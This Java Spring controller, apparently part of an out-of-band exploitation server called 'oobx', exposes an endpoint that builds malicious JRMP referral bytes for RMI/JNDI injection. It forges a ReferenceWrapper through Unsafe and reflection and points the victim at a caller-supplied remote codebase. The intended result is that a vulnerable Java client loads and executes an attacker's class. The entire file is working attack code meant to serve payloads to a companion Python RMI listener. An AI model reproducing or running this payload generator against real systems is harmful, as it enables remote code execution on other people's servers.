package com.oobx.controller;

import com.oobx.rebind.RebindStore;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import sun.misc.Unsafe;

import javax.naming.Reference;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.URL;
import java.rmi.server.RemoteObject;
import java.rmi.server.UID;

/**
 * Generates JRMP referral response bytes for RMI rebind.
 * Called by the Python RMI listener when it needs a rebind payload.
 */
@RestController
@RequestMapping("/rmi")
public class RmiController {

    private final RebindStore rebindStore;

    public RmiController(RebindStore rebindStore) {
        this.rebindStore = rebindStore;
    }

    @GetMapping("/referral")
    public ResponseEntity<byte[]> referral(
            @RequestParam String token,
            @RequestParam String codebase) {
        RebindStore.Entry entry = rebindStore.get(token);
        if (entry == null) {
            return ResponseEntity.status(HttpStatus.NOT_FOUND).build();
        }
        String className = entry.className();

        byte[] referralBytes = buildJrmpReferral(codebase, className);
        return ResponseEntity.ok()
                .header("Content-Type", "application/octet-stream")
                .body(referralBytes);
    }

    private byte[] buildJrmpReferral(String codebase, String className) {
        try {
            URL classpathUrl = new URL(codebase + "#" + className);
            Object wrapper = createReferenceWrapper(classpathUrl, className);

            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bos.write(0x51); // TransportConstants.Return
            try (MarshalOutputStream oos = new MarshalOutputStream(bos, classpathUrl)) {
                oos.writeByte(1); // TransportConstants.NormalReturn
                new UID().write(oos);
                oos.writeObject(wrapper);
                oos.flush();
            }
            return bos.toByteArray();
        } catch (Exception e) {
            throw new IllegalStateException("failed to build JRMP referral", e);
        }
    }

    private Object createReferenceWrapper(URL classpathUrl, String className) throws Exception {
        Class<?> wrapperClass = Class.forName("com.sun.jndi.rmi.registry.ReferenceWrapper");
        Object wrapper = allocate(wrapperClass);

        Field wrappee = wrapperClass.getDeclaredField("wrappee");
        wrappee.setAccessible(true);
        wrappee.set(wrapper, new Reference(className, classpathUrl.getRef(), classpathUrl.toString()));

        Class<?> refClass = Class.forName("sun.rmi.server.UnicastServerRef");
        Constructor<?> ctor = refClass.getDeclaredConstructor(int.class);
        ctor.setAccessible(true);
        Object serverRef = ctor.newInstance(12345);

        Field ref = RemoteObject.class.getDeclaredField("ref");
        ref.setAccessible(true);
        ref.set(wrapper, serverRef);
        return wrapper;
    }

    private static Object allocate(Class<?> cls) throws Exception {
        Field field = Unsafe.class.getDeclaredField("theUnsafe");
        field.setAccessible(true);
        Unsafe unsafe = (Unsafe) field.get(null);
        return unsafe.allocateInstance(cls);
    }

    private static final class MarshalOutputStream extends ObjectOutputStream {
        private final URL sendUrl;

        private MarshalOutputStream(OutputStream out, URL sendUrl) throws IOException {
            super(out);
            this.sendUrl = sendUrl;
        }

        @Override
        protected void annotateClass(Class<?> cl) throws IOException {
            writeObject(sendUrl.toString());
        }

        @Override
        protected void annotateProxyClass(Class<?> cl) throws IOException {
            annotateClass(cl);
        }
    }
}
